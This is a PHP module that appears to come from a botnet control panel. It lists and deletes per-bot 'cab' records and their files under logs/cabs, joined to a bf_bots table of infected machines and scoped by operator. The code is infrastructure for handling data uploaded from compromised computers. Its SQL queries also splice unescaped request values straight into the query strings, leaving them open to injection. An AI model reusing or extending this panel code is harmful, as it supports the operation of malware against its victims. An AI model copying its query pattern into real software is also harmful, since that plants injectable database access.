<?php
get_function('size_format');

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(empty($Cur['str'])) exit;

if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
	$chk = '';
	$chk_a = '';
	$chk_where = '';
}else{
	$chk = ' (chk = \'0\') AND ';
	$chk_a = ' (a.chk = \'0\') AND ';
	$chk_where = ' WHERE (chk = \'0\')';
}

if(preg_match('~^([0-9]+)$~is', $Cur['x']) == true){
	if($_SESSION['user']->config['hunter_limit'] == true){
		$item = $mysqli->query('SELECT a.* FROM bf_cabs a, bf_bots b WHERE '.$chk.'(a.type = \''.$Cur['str'].'\') AND (a.id = \''.$Cur['x'].'\') AND (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.post_id = \''.$_SESSION['user']->id.'\') LIMIT 1');
	}else{
		$item = $mysqli->query('SELECT * FROM bf_cabs WHERE '.$chk.'(type = \''.$Cur['str'].'\') AND (id = \''.$Cur['x'].'\') LIMIT 1');
	}

	if($item->id == $Cur['x'] && $item->type == $Cur['str']){
		if(file_exists('logs/cabs/' . $item->file)){
			unlink('logs/cabs/' . $item->file);
		}
		$mysqli->query('delete from bf_cabs where (id = \''.$item->id.'\')');
		
		if($_SESSION['user']->config['hunter_limit'] == true){
			$items = $mysqli->query('SELECT a.* FROM bf_cabs a, bf_bots b WHERE '.$chk.'(a.type = \''.$Cur['str'].'\') AND (a.prefix = \''.$item->prefix.'\') AND (a.uid = \''.$item->uid.'\') AND (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.post_id = \''.$_SESSION['user']->id.'\') ORDER by a.post_date ASC', null, null, false);
		}else{
			$items = $mysqli->query('SELECT * FROM bf_cabs WHERE '.$chk.'(type = \''.$Cur['str'].'\') AND (prefix = \''.$item->prefix.'\') AND (uid = \''.$item->uid.'\') ORDER by post_date ASC', null, null, false);
		}
		
		$Cur['x'] = $item->prefix . $item->uid;
		$smarty->assign('items', $items);
	}
}elseif(preg_match('~^([A-Za-z0-9]+)$~is', $Cur['x']) == true){
	$matches = explode('0', $Cur['x'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}

	if(!empty($prefix) && !empty($uid)){
		if($_SESSION['user']->config['hunter_limit'] == true){
			$items = $mysqli->query('SELECT a.* FROM bf_cabs a, bf_bots b WHERE '.$chk.'(a.type = \''.$Cur['str'].'\') AND (a.prefix = \''.$prefix.'\') AND (a.uid = \''.$uid.'\') AND (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.post_id = \''.$_SESSION['user']->id.'\') ORDER by a.post_date ASC, ready DESC', null, null, false);
		}else{
			$items = $mysqli->query('SELECT * FROM bf_cabs WHERE '.$chk.'(type = \''.$Cur['str'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date ASC, ready DESC', null, null, false);
		}

		$smarty->assign('items', $items);
	}
}

?>